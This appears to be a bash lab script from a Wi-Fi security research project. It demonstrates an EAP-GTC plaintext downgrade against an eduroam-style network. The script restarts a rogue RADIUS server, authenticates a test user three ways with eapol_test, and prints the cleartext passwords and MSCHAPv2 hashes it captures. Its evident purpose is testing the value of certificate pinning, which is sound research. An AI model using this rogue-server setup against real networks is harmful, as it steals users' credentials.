#!/usr/bin/env bash
# The EAP-GTC plaintext-downgrade scene without hardware: restarts attacker B3
# with fresh capture logs, then drives eapol_test as pablo three ways and shows
# what B3 harvested after each:
#   (1) pinned profile (what the app installs), MSCHAPv2 -> cert fails, nothing
#   (2) unpinned client that accepts GTC            -> CLEARTEXT password captured
#   (3) unpinned client that insists on MSCHAPv2    -> falls back, HASH captured
# eapol_test always cooperates with whatever phase2 it is told, so this proves
# the server side. What a real iOS/Android device does with B3's GTC offer (auto-
# switch? warn? refuse?) is the thing to observe live over the air.
set -euo pipefail
REPO="$(cd "$(dirname "$0")/../../.." && pwd)"
# shellcheck disable=SC1091
. <(tr -d '\r' < "$REPO/lab-secrets/radius/secrets.env")

bash "$REPO/lab/eduroam/radius/stop.sh" attacker-b3 >/dev/null 2>&1 || true
sleep 1
rm -f "$HOME/gecko-radius/attacker-b3/captured-plain.log" \
      "$HOME/gecko-radius/attacker-b3/captured-hashes.log"
bash "$REPO/lab/eduroam/radius/run.sh" attacker-b3 bg >/dev/null
sleep 4

conf=$(mktemp)
trap 'rm -f "$conf"' EXIT

attempt() { # phase2, extra network lines -> prints eapol_test's last line (SUCCESS/FAILURE)
    cat > "$conf" <<EOF
network={
	key_mgmt=WPA-EAP
	eap=PEAP
	identity="pablo@uni-wipkingen.ch"
	anonymous_identity="anonymous@uni-wipkingen.ch"
	password="$TEST_PASSWORD"
	phase2="auth=$1"
$2
}
EOF
    eapol_test -c "$conf" -a 127.0.0.1 -p 1818 -s testing123 -t 10 2>&1 | tail -1
}

pinned="	ca_cert=\"$REPO/lab-secrets/pki/uni-wipkingen-ca.pem\"
	domain_match=\"radius-service.uni-wipkingen.ch\""

echo "### (1) pinned profile, MSCHAPv2 (what the app installs): $(attempt MSCHAPV2 "$pinned")"
echo "### (2) unpinned client accepting GTC:                    $(attempt GTC "")"
echo "### (3) unpinned client insisting on MSCHAPv2:            $(attempt MSCHAPV2 "")"
echo
echo "== cleartext (GTC) =="
bash "$REPO/lab/eduroam/radius/extract-plain.sh" attacker-b3
echo
echo "== hashes (MSCHAPv2 fallback) =="
bash "$REPO/lab/eduroam/radius/extract-hashes.sh" attacker-b3
